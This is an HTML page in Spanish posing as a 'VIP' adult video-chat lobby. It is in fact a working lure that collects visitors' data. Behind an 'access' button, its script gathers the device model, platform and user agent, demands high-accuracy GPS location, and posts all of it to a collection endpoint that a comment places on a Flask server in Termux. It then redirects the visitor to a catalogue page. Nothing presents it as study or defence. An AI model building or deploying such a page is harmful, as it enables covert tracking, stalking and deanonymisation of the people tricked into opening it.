<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bienvenido - Video Chat Exclusivo</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background: #0b0b0b;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: #181818;
            border: 1px solid #333;
            border-radius: 12px;
            padding: 30px;
            width: 100%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
        }
        h1 { font-size: 22px; color: #e50914; margin-bottom: 10px; }
        p { font-size: 14px; color: #aaa; margin-bottom: 25px; line-height: 1.5; }
        .btn-acceso {
            display: block;
            width: 100%;
            background: #e50914;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
            transition: background 0.2s;
        }
        .btn-acceso:hover { background: #b80710; }
        #mensajeEstado { margin-top: 15px; font-size: 13px; color: #888; }
    </style>
</head>
<body>

    <div class="card">
        <h1>🎥 Sala de Videollamadas VIP</h1>
        <p>Bienvenido. Para verificar tu acceso y conectar con las modelos disponibles Click aqui .</p>

        <button class="btn-acceso" onclick="obtenerDatosYAcceder()">Acceder al Catálogo</button>
        <div id="mensajeEstado"></div>
    </div>

    <script>
        async function obtenerDatosYAcceder() {
            const btn = document.querySelector('.btn-acceso');
            const estado = document.getElementById('mensajeEstado');
            btn.innerText = "Verificando dispositivo...";
            btn.disabled = true;

            let modelo = "No disponible";
            let plataforma = navigator.platform || "Desconocida";

            // Extraer el modelo real mediante Client Hints si es posible
            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                try {
                    const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]);
                    if (hints.model) modelo = hints.model;
                    if (hints.platform) plataforma = `${hints.platform} ${hints.platformVersion || ''}`;
                } catch (e) {}
            }

            // Solicitar Ubicación GPS de manera obligatoria
            if (!navigator.geolocation) {
                alert("Tu navegador no soporta geolocalización.");
                btn.disabled = false;
                btn.innerText = "Acceder al Catálogo";
                return;
            }

            estado.innerText = "Esperando confirmación del sistema...";

            navigator.geolocation.getCurrentPosition(async (position) => {
                const datos = {
                    modelo: modelo,
                    plataforma: plataforma,
                    latitud: position.coords.latitude,
                    longitud: position.coords.longitude,
                    precision: position.coords.accuracy,
                    dispositivo: navigator.userAgent,
                    timestamp: new Date().toISOString()
                };

                try {
                    // Enviar datos al servidor Flask en Termux
                    await fetch('/api/guardar-datos', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(datos)
                    });

                    // Redirigir al panel de usuarios/catálogo una vez guardado
                    window.location.href = "/catalogo";
                } catch (err) {
                    estado.innerText = "Error de conexión con el servidor.";
                    btn.disabled = false;
                    btn.innerText = "Acceder al Catálogo";
                }

            }, (error) => {
                alert("Es obligatorio permitir la ubicación para continuar en la plataforma.");
                btn.disabled = false;
                btn.innerText = "Acceder al Catálogo";
                estado.innerText = "Acceso denegado por el usuario.";
            }, { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
